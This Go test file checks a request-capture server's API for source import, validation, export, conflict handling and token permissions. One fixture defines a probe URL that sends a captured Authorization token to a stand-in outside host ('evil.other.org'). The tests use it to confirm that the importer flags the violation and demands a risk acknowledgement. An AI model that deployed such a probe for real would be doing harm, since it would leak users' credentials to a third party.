package server

import (
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/lonelyman0108/ferry/internal/probe"
	"github.com/lonelyman0108/ferry/internal/source"
	"github.com/lonelyman0108/ferry/internal/store"
)

func TestSourceLifecycle(t *testing.T) {
	h := ready(t)

	var examples []exampleView
	h.do("GET", "/api/v1/examples", nil, &examples)
	if len(examples) == 0 || examples[0].Key != "ninebot" {
		t.Fatalf("示例列表 = %+v", examples)
	}
	var created sourceView
	if code := h.do("POST", "/api/v1/examples/ninebot/import", map[string]any{}, &created); code != 201 {
		t.Fatalf("导入示例 = %d", code)
	}
	var dup errorBody
	if code := h.do("POST", "/api/v1/examples/ninebot/import", map[string]any{}, &dup); code != 409 ||
		len(dup.Problems) != 1 || dup.Problems[0].Path != "key" {
		t.Errorf("重复导入 = %d %+v，期望 409 且指向 key", code, dup)
	}
	id := itoa(created.ID)

	var tr tryResult
	sign := map[string]any{
		"source": created.Doc,
		"method": "POST", "url": "https://cn-cbu-gateway.ninebot.com/portal/api/user-sign/v2/sign",
		"headers": map[string]string{"Authorization": "eyJhbGciOiJIUzI1NiJ9.e30.sig-value-here"},
		"body":    `{"deviceId":"DEV-001"}`,
	}
	if code := h.do("POST", "/api/v1/sources/try", sign, &tr); code != 200 {
		t.Fatalf("试跑 = %d", code)
	}
	if len(tr.Matched) != 2 || !tr.Fields["device_id"].OK || tr.Outputs["NINEBOT_DEVICE_ID"].Value != "DEV-001" ||
		tr.Outputs["NINEBOT_AUTHORIZATION"].Value != "eyJhbGciOiJIUzI1NiJ9.e30.sig-value-here" {
		t.Errorf("签到请求试跑结果不对：%+v", tr)
	}
	status := map[string]any{"source": created.Doc, "url": "https://cn-cbu-gateway.ninebot.com/portal/api/user-sign/v2/status", "headers": map[string]string{"authorization": "eyJxx.yy.zz-long-enough"}}
	h.do("POST", "/api/v1/sources/try", status, &tr)
	if len(tr.Matched) != 1 || !tr.Fields["authorization"].OK || tr.Fields["device_id"].OK || tr.Outputs["NINEBOT_DEVICE_ID"].OK {
		t.Errorf("状态请求只应取到 authorization：%+v", tr)
	}
	for _, m := range tr.Matchers {
		if !m.Matched && m.Reason != "路径不匹配" {
			t.Errorf("规则 %s 未命中的原因 = %q，期望“路径不匹配”", m.Name, m.Reason)
		}
	}

	// 未保存的草稿也能试跑：改了域名的规则给出未命中原因。
	draft := created.Doc
	draft.Matchers = append([]source.MatcherDoc{}, draft.Matchers...)
	draft.Matchers[0].Host = "other.example.com"
	sign["source"] = draft
	h.do("POST", "/api/v1/sources/try", sign, &tr)
	if tr.Matchers[0].Matched || tr.Matchers[0].Reason != "域名不匹配" {
		t.Errorf("草稿试跑 = %+v，期望第一条规则域名不符", tr.Matchers)
	}

	var got sourceView
	h.do("GET", "/api/v1/sources/"+id, nil, &got)
	got.Doc.Fields[1].Matcher = "missing"
	got.Doc.Outputs = append(got.Doc.Outputs, got.Doc.Outputs[0])
	var bad errorBody
	if code := h.do("PUT", "/api/v1/sources/"+id, got.Doc, &bad); code != 400 || len(bad.Details) < 2 {
		t.Errorf("非法更新 = %d %+v，期望 400 且列出全部问题", code, bad)
	}
	// problems 与 details 一一对应，带上出错位置。
	if len(bad.Problems) != len(bad.Details) || bad.Problems[0].Path != "fields[1].matcher" ||
		!strings.HasPrefix(bad.Details[0], "fields[1].matcher ") || strings.HasPrefix(bad.Problems[0].Message, "fields") {
		t.Errorf("非法更新的 problems = %+v，details = %v", bad.Problems, bad.Details)
	}
	got.Doc.Key = "other"
	got.Doc.Fields[1].Matcher = "sign"
	got.Doc.Outputs = got.Doc.Outputs[:2]
	if code := h.do("PUT", "/api/v1/sources/"+id, got.Doc, nil); code != 409 {
		t.Errorf("改 key = %d，期望 409", code)
	}

	resp, err := h.client.Get(h.ts.URL + "/api/v1/sources/" + id + "/export")
	if err != nil {
		t.Fatal(err)
	}
	jsonText, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	if resp.StatusCode != 200 || !strings.Contains(string(jsonText), `"key": "ninebot"`) || !strings.Contains(resp.Header.Get("Content-Disposition"), "ferry-ninebot.json") {
		t.Fatalf("导出 = %d %q", resp.StatusCode, jsonText)
	}
	if code := h.do("DELETE", "/api/v1/sources/"+id, nil, nil); code != 200 {
		t.Fatalf("删除 = %d", code)
	}

	var preview importPreviewOutput
	if code := h.do("POST", "/api/v1/sources/import/preview", map[string]string{"text": string(jsonText)}, &preview); code != 200 || len(preview.Items) != 1 || !preview.Items[0].Valid {
		t.Fatalf("预览导出的 JSON = %d %+v", code, preview)
	}
	var applied importApplyOutput
	applyIn := importApplyInput{Items: []importApplyItem{{Meta: preview.Items[0].Meta, Source: preview.Items[0].Source}}}
	if code := h.do("POST", "/api/v1/sources/import", applyIn, &applied); code != 200 || applied.Succeeded != 1 || len(applied.Results) != 1 || !applied.Results[0].OK {
		t.Fatalf("导出的 JSON 再导入 = %d %+v", code, applied)
	}

	var importErr errorBody
	if code := h.do("POST", "/api/v1/sources/import/preview", map[string]string{"text": "{oops"}, &importErr); code != 400 {
		t.Errorf("坏 JSON = %d", code)
	}
	// 外壳合法、来源定义不合法的 JSON 在预览结果中逐条返回 details 和带位置的 problems。
	badDoc := `{"format":1,"meta":{"version":1},"source":{"key":"other","name":"其他","matchers":[{"name":"main","host":""}],"fields":[]}}`
	preview = importPreviewOutput{}
	if code := h.do("POST", "/api/v1/sources/import/preview", map[string]string{"text": badDoc}, &preview); code != 200 ||
		len(preview.Items) != 1 || preview.Items[0].Valid || len(preview.Items[0].Details) != 2 || len(preview.Items[0].Problems) != 2 ||
		preview.Items[0].Problems[0].Path != "matchers[0].host" || preview.Items[0].Problems[1].Path != "fields" {
		t.Errorf("不合法的 JSON 定义 = %d %+v", code, preview)
	}

	var list []sourceSummary
	h.do("GET", "/api/v1/sources", nil, &list)
	if len(list) != 1 || list[0].Fields != 2 || list[0].Matchers != 2 {
		t.Errorf("列表 = %+v", list)
	}

	var tok createdToken
	h.do("POST", "/api/v1/tokens", map[string]string{"name": "ci"}, &tok)
	bearer := &harness{t: t, srv: h.srv, ts: h.ts, client: http.DefaultClient}
	if code := bearer.do("GET", "/api/v1/sources", nil, nil, "Authorization", "Bearer "+tok.Token); code != 200 {
		t.Errorf("令牌读来源 = %d", code)
	}
	if code := bearer.do("POST", "/api/v1/examples/ninebot/import", map[string]any{}, nil, "Authorization", "Bearer "+tok.Token); code != 403 {
		t.Errorf("令牌写来源 = %d，期望 403", code)
	}
}

func TestSourcesImportPreviewAndApply(t *testing.T) {
	h := ready(t)

	// 先导入九号示例，并写入一条身份与版本记录，用来验证覆盖更新时身份与版本保留。
	var created sourceView
	if code := h.do("POST", "/api/v1/examples/ninebot/import", map[string]any{}, &created); code != 201 {
		t.Fatalf("导入示例 = %d", code)
	}
	db := h.srv.store().DB
	ident := store.Identity{SourceID: created.ID, Key: "DEV-100"}
	if err := db.Create(&ident).Error; err != nil {
		t.Fatal(err)
	}

	// 准备远程 HTTP 服务提供包含 2 个条目的 JSON 数组：第 1 项与 ninebot 冲突且修改了描述，第 2 项违反探测域名硬规则。
	modifiedDoc := created.Doc
	modifiedDoc.Description = "更新后的说明"
	riskyDoc := source.Doc{
		Key:    "risky",
		Name:   "外部探测来源",
		Notify: source.NotifyChanged,
		Debug:  true,
		Matchers: []source.MatcherDoc{
			{Name: "api", Host: "api.example.com"},
		},
		Fields: []source.FieldDoc{
			{Key: "token", In: "header", Path: "Authorization"},
		},
		Probe: &probe.Spec{
			URL:    "https://evil.other.org/check?t={{.token}}",
			Expect: "status == 200",
		},
	}
	env1, err := source.MarshalEnvelope(modifiedDoc, source.Meta{Version: 2, Tags: []string{"出行"}})
	if err != nil {
		t.Fatal(err)
	}
	env2, err := source.MarshalEnvelope(riskyDoc, source.Meta{Version: 1})
	if err != nil {
		t.Fatal(err)
	}
	batchJSON := "[" + string(env1) + "," + string(env2) + "]"

	remote := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/redirect-ftp" {
			http.Redirect(w, r, "ftp://example.com/file.json", http.StatusFound)
			return
		}
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write([]byte(batchJSON))
	}))
	defer remote.Close()

	// 非法跳转协议应被拦截。
	var badRedirect errorBody
	if code := h.do("POST", "/api/v1/sources/import/preview", map[string]string{"url": remote.URL + "/redirect-ftp"}, &badRedirect); code != 400 {
		t.Errorf("跳转到 ftp 应返回 400，实际 = %d", code)
	}

	// 链接预览应返回 2 个条目：第 1 项提示 key 冲突与本地差异，第 2 项提示硬规则违规与警告。
	var preview importPreviewOutput
	if code := h.do("POST", "/api/v1/sources/import/preview", map[string]string{"url": remote.URL + "/sources.json"}, &preview); code != 200 {
		t.Fatalf("链接预览 = %d", code)
	}
	if len(preview.Items) != 2 {
		t.Fatalf("预览条目数 = %d", len(preview.Items))
	}
	if !preview.Items[0].Conflict || !preview.Items[0].LocalModified || preview.Items[0].ExistingID != created.ID {
		t.Errorf("第 1 项冲突状态不对：%+v", preview.Items[0])
	}
	if len(preview.Items[1].Violations) == 0 || len(preview.Items[1].Warnings) != 2 {
		t.Errorf("第 2 项应包含硬规则违规和 2 条警告：%+v", preview.Items[1])
	}

	// 未勾选风险确认时，第 2 项应当失败，第 1 项选择覆盖更新应当成功，且保留原身份记录。
	applyReq := importApplyInput{
		Items: []importApplyItem{
			{
				Meta:     preview.Items[0].Meta,
				Source:   preview.Items[0].Source,
				Conflict: conflictOverwrite,
			},
			{
				Meta:        preview.Items[1].Meta,
				Source:      preview.Items[1].Source,
				Acknowledge: false,
			},
		},
	}
	var applyOut importApplyOutput
	if code := h.do("POST", "/api/v1/sources/import", applyReq, &applyOut); code != 200 {
		t.Fatalf("执行导入 = %d", code)
	}
	if applyOut.Succeeded != 1 || applyOut.Failed != 1 || !applyOut.Results[0].OK || applyOut.Results[0].Action != "updated" || applyOut.Results[1].OK {
		t.Fatalf("导入结果不对：%+v", applyOut)
	}

	// 验证覆盖更新后原身份仍然存在，且描述已更新。
	var count int64
	db.Model(&store.Identity{}).Where("source_id = ?", created.ID).Count(&count)
	if count != 1 {
		t.Errorf("覆盖更新后身份记录数 = %d，期望保留 1 条", count)
	}
	var updatedView sourceView
	h.do("GET", "/api/v1/sources/"+itoa(created.ID), nil, &updatedView)
	if updatedView.Description != "更新后的说明" {
		t.Errorf("覆盖更新后 Description = %q", updatedView.Description)
	}

	// 测试冲突改用新 key 另存，以及勾选风险确认后导入第 2 项。
	applyReq2 := importApplyInput{
		Items: []importApplyItem{
			{
				Meta:     preview.Items[0].Meta,
				Source:   preview.Items[0].Source,
				Conflict: conflictRename,
				NewKey:   "ninebot_backup",
			},
			{
				Meta:        preview.Items[1].Meta,
				Source:      preview.Items[1].Source,
				Acknowledge: true,
			},
		},
	}
	applyOut = importApplyOutput{}
	if code := h.do("POST", "/api/v1/sources/import", applyReq2, &applyOut); code != 200 || applyOut.Succeeded != 2 || applyOut.Failed != 0 {
		t.Fatalf("改名与确认风险后导入 = %d %+v", code, applyOut)
	}
}
